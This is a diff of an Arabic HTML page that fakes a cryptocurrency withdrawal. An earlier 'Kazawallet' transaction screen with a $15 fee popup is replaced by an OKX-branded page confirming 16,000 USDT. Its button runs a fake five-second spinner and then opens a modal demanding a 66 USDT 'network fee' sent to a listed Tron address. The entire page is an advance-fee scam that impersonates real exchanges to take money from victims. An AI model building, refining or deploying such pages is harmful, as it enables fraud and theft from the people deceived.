@@ -1,177 +1,153 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>معاملة كازاواليت</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>تأكيد السحب</title>
   <style>
     body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f7fa;
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #008000;
-      color: #ffffff;
+      padding: 0;
+      color: #333;
       direction: rtl;
     }
     .container {
-      padding: 40px;
-      max-width: 600px;
-      margin: auto;
+      max-width: 420px;
+      margin: 40px auto;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+      padding: 24px;
     }
     .logo {
       text-align: center;
-      margin-bottom: 30px;
-    }
-    .logo img {
-      max-width: 180px;
-    }
-    .status-bar {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 30px;
-    }
-    .status {
-      text-align: center;
-    }
-    .status-icon {
-      font-size: 24px;
-      margin-bottom: 5px;
-    }
-    .status.completed .status-icon {
-      color: #00ff00;
-    }
-    .status.processing .status-icon {
-      color: #ffa500;
-    }
-    .order-number {
-      text-align: center;
-      font-size: 18px;
-      font-weight: bold;
-      color: #000000;
-      background-color: #ffffff;
-      padding: 10px;
-      border-radius: 8px;
       margin-bottom: 20px;
     }
-    .card {
-      background-color: #ffffff;
-      color: #000000;
-      border-radius: 10px;
-      padding: 20px;
+    .logo img {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      object-fit: contain;
     }
-    .row {
-      margin-bottom: 15px;
-    }
-    .label {
-      font-weight: bold;
-      font-size: 15px;
-    }
-    .value {
-      margin-top: 5px;
-      font-size: 16px;
-    }
-    .popup {
-      display: none;
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      background-color: #ffffff;
-      color: #000000;
-      padding: 25px 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
-      max-width: 90%;
-      text-align: center;
-      z-index: 999;
-      font-weight: bold;
-      font-size: 16px;
-      border: 2px solid #ffa500;
-    }
-    .popup h3 {
-      margin-top: 0;
+    .title {
       font-size: 20px;
-      color: #d00000;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 16px;
     }
-    .popup p {
-      margin: 15px 0;
-      font-size: 16px;
-    }
-    .popup button {
-      background-color: #008000;
-      color: #ffffff;
-      border: none;
-      padding: 10px 25px;
-      font-weight: bold;
+    .details {
       font-size: 15px;
+      line-height: 1.8;
+      margin-bottom: 20px;
+    }
+    .details strong {
+      display: inline-block;
+      width: 140px;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background-color: #0052ff;
+      color: white;
+      font-weight: bold;
+      border: none;
       border-radius: 8px;
       cursor: pointer;
+      font-size: 16px;
+    }
+    .btn:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+    }
+    .spinner {
+      display: none;
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0052ff;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .modal {
+      display: none;
+      background: rgba(0,0,0,0.6);
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: white;
+      padding: 24px;
+      border-radius: 12px;
+      max-width: 360px;
+      text-align: center;
+    }
+    .modal-content h3 {
+      margin-bottom: 12px;
+      color: #d32f2f;
+    }
+    .modal-content p {
+      font-size: 14px;
+      margin-bottom: 16px;
+    }
+    .deposit-address {
+      font-family: monospace;
+      background: #eee;
+      padding: 8px;
+      border-radius: 6px;
+      word-break: break-word;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="kazawallet-logo.png" alt="شعار كازاواليت">
-    </div>
 
-    <div class="status-bar">
-      <div class="status completed">
-        <div class="status-icon">✔️</div>
-        <div>التحقق</div>
-        <div>مكتمل</div>
-      </div>
-      <div class="status completed">
-        <div class="status-icon">✔️</div>
-        <div>الدفع</div>
-        <div>مكتمل</div>
-      </div>
-      <div class="status processing">
-        <div class="status-icon">⏳</div>
-        <div>المعالجة</div>
-        <div>قيد التنفيذ</div>
-      </div>
-      <div class="status processing">
-        <div class="status-icon">⏳</div>
-        <div>التنفيذ</div>
-        <div>قيد الانتظار</div>
-      </div>
-    </div>
-
-    <div class="order-number">رقم الطلب #18222173</div>
-
-    <div class="card">
-      <div class="row">
-        <div class="label">قيمة الدفع</div>
-        <div class="value">$7500</div>
-      </div>
-      <div class="row">
-        <div class="label">المبلغ المستلم</div>
-        <div class="value">$7500</div>
-      </div>
-      <div class="row">
-        <div class="label">عنوان المحفظة</div>
-        <div class="value">uSDEP</div>
-      </div>
-      <div class="row">
-        <div class="label">البلوكتشين المختار</div>
-        <div class="value">USDTBEP</div>
-      </div>
-      <div class="row">
-        <div class="label">رسوم الشبكة</div>
-        <div class="value">$15 (رسوم إلزامية لضمان الأمان والامتثال القانوني)</div>
-      </div>
-    </div>
-
-    <div class="popup" id="feePopup">
-      <h3>خطأ في تقليل الرسوم</h3>
-      <p>تحتاج فقط إلى دفع <strong>$15</strong> لإتمام هذه المعاملة بأمان ووفقًا للاتفاق القانوني.</p>
-      <button onclick="document.getElementById('feePopup').style.display='none'">موافق</button>
-    </div>
+<div class="container">
+  <div class="logo">
+    <img src="https://cryptologos.cc/logos/okx-logo.png" alt="شعار OKX" />
   </div>
+  <div class="title">تأكيد السحب</div>
+  <div class="details">
+    <p><strong>المبلغ:</strong> 16,000 USDT</p>
+    <p><strong>السعر:</strong> $1 لكل USDT</p>
+    <p><strong>الشبكة:</strong> Tron (TRC20)</p>
+    <p><strong>رسوم الشبكة:</strong> 66 USDT</p>
+    <p><strong>الحالة:</strong> قيد المعالجة</p>
+    <p><strong>العنوان:</strong> TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</p>
+    <p><strong>تاريخ الإرسال:</strong> 6 أكتوبر 2025 - 10:42 صباحًا</p>
+    <p><strong>رقم المرجع:</strong> 3452420025</p>
+  </div>
+  <button class="btn" onclick="confirmWithdrawal()">تأكيد السحب</button>
+  <div class="spinner" id="spinner"></div>
+</div>
 
-  <script>
-    window.onload = function() {
-      document.getElementById('feePopup').style.display = 'block';
-    };
-  </script>
+<div class="modal" id="errorModal">
+  <div class="modal-content">
+    <h3>مطلوب دفع رسوم الشبكة</h3>
+    <p>لإتمام السحب الفوري عبر BANK و KAZA-WALLET، يرجى إرسال 66 USDT إلى العنوان التالي:</p>
+    <div class="deposit-address">TJj8uPa1tvJ66a5cjEb7Yc32v3iXdFWQSn</div>
+  </div>
+</div>
+
+<script>
+  function confirmWithdrawal() {
+    document.querySelector('.btn').disabled = true;
+    document.getElementById('spinner').style.display = 'block';
+    setTimeout(() => {
+      document.getElementById('spinner').style.display = 'none';
+      document.getElementById('errorModal').style.display = 'flex';
+    }, 5000);
+  }
+</script>
+
 </body>
 </html>
